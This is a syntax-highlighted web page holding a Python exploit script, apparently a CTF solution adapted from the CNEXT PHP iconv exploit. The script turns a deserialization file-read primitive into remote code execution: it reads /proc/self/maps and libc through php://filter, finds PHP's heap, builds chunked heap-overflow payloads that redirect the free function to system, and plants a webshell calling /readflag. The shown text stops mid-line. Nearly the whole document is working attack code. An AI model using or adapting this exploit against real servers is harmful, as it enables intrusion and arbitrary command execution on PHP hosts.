class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> annotations<br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> requests.exceptions <span class="hljs-keyword">import</span> ChunkedEncodingError, ConnectionError<br><span class="hljs-keyword">from</span> ten <span class="hljs-keyword">import</span> *<br><br><br>HEAP_SIZE = <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span><br>BUG = <span class="hljs-string">&quot;劄&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Remote</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        self.url = url<br>        self.session = Session()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br><br>        path = <span class="hljs-string">&#x27;O:4:&quot;cls1&quot;:2:&#123;s:3:&quot;cls&quot;;O:4:&quot;cls2&quot;:2:&#123;s:8:&quot;filename&quot;;s:&#x27;</span>+ <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(path))+<span class="hljs-string">&#x27;:&quot;&#x27;</span>+ path +<span class="hljs-string">&#x27;&quot;;s:3:&quot;txt&quot;;s:0:&quot;&quot;;&#125;s:3:&quot;arr&quot;;a:1:&#123;i:1;s:7:&quot;fileput&quot;;&#125;&#125;&#x27;</span><br>        path = base64.encode(path)<br><br>        <span class="hljs-keyword">return</span> self.session.get(self.url+<span class="hljs-string">&quot;?ser=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        path = <span class="hljs-string">f&quot;php://filter/convert.base64-encode/resource=<span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>        response = self.send(path)<br>        data = response.re.search(<span class="hljs-string">b&quot;Your file(.*)&quot;</span>, flags=re.S).group(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> base64.decode(data)<br><br><br><span class="hljs-meta">@entry</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&quot;Target URL&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;sleep_time&quot;</span>, <span class="hljs-string">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;heap&quot;</span>, <span class="hljs-string">&quot;Address of the main zend_mm_heap structure.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;pad&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;operations with this size, increase this. Defaults to 20.&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta"></span>)</span><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span><br><br>    url: <span class="hljs-built_in">str</span><br>    command: <span class="hljs-built_in">str</span><br>    sleep: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span><br>    heap: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span><br>    pad: <span class="hljs-built_in">int</span> = <span class="hljs-number">20</span><br><br>    url = <span class="hljs-string">&quot;http://192.168.18.24/&quot;</span><br>    command = <span class="hljs-string">&quot;echo &#x27;&lt;?php system(\&quot;/readflag\&quot;);&#x27;&gt;/var/www/html/phpinfo.php&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__post_init__</span>(<span class="hljs-params">self</span>):<br>        self.remote = Remote(self.url)<br>        self.log = logger(<span class="hljs-string">&quot;EXPLOIT&quot;</span>)<br>        self.info = &#123;&#125;<br>        self.heap = self.heap <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(self.heap, <span class="hljs-number">16</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_vulnerable</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various</span><br><span class="hljs-string">        wrappers and filters that the exploit needs.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_download</span>(<span class="hljs-params">path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> self.remote.download(path)<br>            <span class="hljs-keyword">except</span> ConnectionError:<br>                failure(<span class="hljs-string">&quot;Target not [b]reachable[/] ?&quot;</span>)<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_token</span>(<span class="hljs-params">text: <span class="hljs-built_in">str</span>, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>            result = safe_download(path)<br>            <span class="hljs-keyword">return</span> text.encode() == result<br><br>        text = tf.random.string(<span class="hljs-number">50</span>).encode()<br>        base64 = b64(text, misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br><br>        result = safe_download(path)<br><br>        <span class="hljs-keyword">if</span> text <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            msg_failure(<span class="hljs-string">&quot;Remote.download did not return the test string&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Expected test string: <span class="hljs-subst">&#123;text&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Got: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            failure(<span class="hljs-string">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]data://[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        base64 = b64(text.encode(), misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;php://filter//resource=data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, path):<br>            failure(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        base64 = b64(compress(text.encode()), misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, path):<br>            failure(<span class="hljs-string">&quot;The [i]zlib[/] extension is not enabled&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]zlib[/] extension is enabled&quot;</span>)<br><br>        msg_success(<span class="hljs-string">&quot;Exploit preconditions are satisfied&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">with</span> msg_status(<span class="hljs-string">f&quot;Downloading [i]<span class="hljs-subst">&#123;path&#125;</span>[/]...&quot;</span>):<br>            <span class="hljs-keyword">return</span> self.remote.download(path)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_regions</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">list</span>[Region]:<br>        maps = self.get_file(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>)<br>        maps = maps.decode()<br>        PATTERN = re.<span class="hljs-built_in">compile</span>(<br>            <span class="hljs-string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="hljs-string">r&quot;.*&quot;</span> <span class="hljs-string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="hljs-string">r&quot;(.*)&quot;</span><br>        )<br>        regions = []<br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> table.split(maps, strip=<span class="hljs-literal">True</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> := PATTERN.<span class="hljs-keyword">match</span>(region):<br>                start = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-number">16</span>)<br>                stop = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)<br>                permissions = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)<br>                path = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">4</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;[&quot;</span> <span class="hljs-keyword">in</span> path:<br>                    path = path.rsplit(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>]<br>                <span class="hljs-keyword">else</span>:<br>                    path = <span class="hljs-string">&quot;&quot;</span><br>                current = Region(start, stop, permissions, path)<br>                regions.append(current)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(maps)<br>                failure(<span class="hljs-string">&quot;Unable to parse memory mappings&quot;</span>)<br><br>        self.log.info(<span class="hljs-string">f&quot;Got <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(regions)&#125;</span> memory regions&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> regions<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_symbols_and_addresses</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        regions = self.get_regions()<br><br>        LIBC_FILE = <span class="hljs-string">&quot;1.so&quot;</span><br><br>        self.info[<span class="hljs-string">&quot;heap&quot;</span>] = self.heap <span class="hljs-keyword">or</span> self.find_main_heap(regions)<br><br>        libc = self._get_region(regions, <span class="hljs-string">&quot;libc-&quot;</span>, <span class="hljs-string">&quot;libc.so&quot;</span>)<br><br>        self.download_file(<span class="hljs-string">&quot;/usr/lib/x86_64-linux-gnu/libc.so.6&quot;</span> ,LIBC_FILE)<br><br>        self.info[<span class="hljs-string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="hljs-literal">False</span>)<br>        self.info[<span class="hljs-string">&quot;libc&quot;</span>].address = libc.start<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_region</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region], *names: <span class="hljs-built_in">str</span></span>) -&gt; Region:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> regions:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(name <span class="hljs-keyword">in</span> region.path <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> names):<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            failure(<span class="hljs-string">&quot;Unable to locate region&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> region<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">self, remote_path: <span class="hljs-built_in">str</span>, local_path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span><br>        data = self.get_file(remote_path)<br>        Path(local_path).write(data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_main_heap</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region]</span>) -&gt; Region:<br><br>        heaps = [<br>            region.stop - HEAP_SIZE + <span class="hljs-number">0x40</span><br>            <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(regions)<br>            <span class="hljs-keyword">if</span> region.permissions == <span class="hljs-string">&quot;rw-p&quot;</span><br>            <span class="hljs-keyword">and</span> region.size &gt;= HEAP_SIZE<br>            <span class="hljs-keyword">and</span> region.stop &amp; (HEAP_SIZE - <span class="hljs-number">1</span>) == <span class="hljs-number">0</span><br>            <span class="hljs-keyword">and</span> region.path == <span class="hljs-string">&quot;&quot;</span><br>        ]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> heaps:<br>            failure(<span class="hljs-string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)<br><br>        first = heaps[<span class="hljs-number">0</span>]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(heaps) &gt; <span class="hljs-number">1</span>:<br>            heaps = <span class="hljs-string">&quot;, &quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">hex</span>, heaps))<br>            msg_info(<span class="hljs-string">f&quot;Potential heaps: [i]<span class="hljs-subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            msg_info(<span class="hljs-string">f&quot;Using [i]<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> first<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        self.check_vulnerable()<br>        self.get_symbols_and_addresses()<br>        self.exploit()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit_path</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br><br>        LIBC = self.info[<span class="hljs-string">&quot;libc&quot;</span>]<br>        ADDR_EMALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_malloc&quot;</span>]<br>        ADDR_EFREE = LIBC.symbols[<span class="hljs-string">&quot;__libc_system&quot;</span>]<br>        ADDR_EREALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_realloc&quot;</span>]<br><br>        ADDR_HEAP = self.info[<span class="hljs-string">&quot;heap&quot;</span>]<br>        ADDR_FREE_SLOT = ADDR_HEAP + <span class="hljs-number">0x20</span><br>        ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="hljs-number">0x0168</span><br><br>        ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="hljs-number">0x10</span><br><br>        CS = <span class="hljs-number">0x100</span><br><br>        <span class="hljs-comment"># Pad needs to stay at size 0x100 at every step</span><br>        pad_size = CS - <span class="hljs-number">0x18</span><br>        pad = <span class="hljs-string">b&quot;\x00&quot;</span> * pad_size<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = compressed_bucket(pad)<br><br>        step1_size = <span class="hljs-number">1</span><br>        step1 = <span class="hljs-string">b&quot;\x00&quot;</span> * step1_size<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1, CS)<br>        step1 = compressed_bucket(step1)<br><br><br>        step2_size = <span class="hljs-number">0x48</span><br>        step2 = <span class="hljs-string">b&quot;\x00&quot;</span> * (step2_size + <span class="hljs-number">8</span>)<br>        step2 = chunked_chunk(step2, CS)<br>        step2 = chunked_chunk(step2)<br>        step2 = compressed_bucket(step2)<br><br>        step2_write_ptr = <span class="hljs-string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="hljs-string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr)<br>        step2_write_ptr = compressed_bucket(step2_write_ptr)<br><br>        step3_size = CS<br><br>        step3 = <span class="hljs-string">b&quot;\x00&quot;</span> * step3_size<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3) == CS<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = compressed_bucket(step3)<br><br>        step3_overflow = <span class="hljs-string">b&quot;\x00&quot;</span> * (step3_size - <span class="hljs-built_in">len</span>(BUG)) + BUG<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3_overflow) == CS<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = compressed_bucket(step3_overflow)<br><br>        step4_size = CS<br>        step4 = <span class="hljs-string">b&quot;=00&quot;</span> + <span class="hljs-string">b&quot;\x00&quot;</span> * (step4_size - <span class="hljs-number">1</span>)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = compressed_bucket(step4)<br><br>        step4_pwn = ptr_bucket(<br>            <span class="hljs-number">0x200000</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-comment"># free_slot</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_CUSTOM_HEAP,  <span class="hljs-comment"># 0x18</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_HEAP,  <span class="hljs-comment"># 0x140</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            size=CS,<br>        )<br><br>        step4_custom_heap = ptr_bucket(<br>            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="hljs-number">0x18</span><br>        )<br><br>        step4_use_custom_heap_size = <span class="hljs-number">0x140</span><br><br>        COMMAND = self.command<br>        COMMAND = <span class="hljs-string">f&quot;kill -9 $PPID; <span 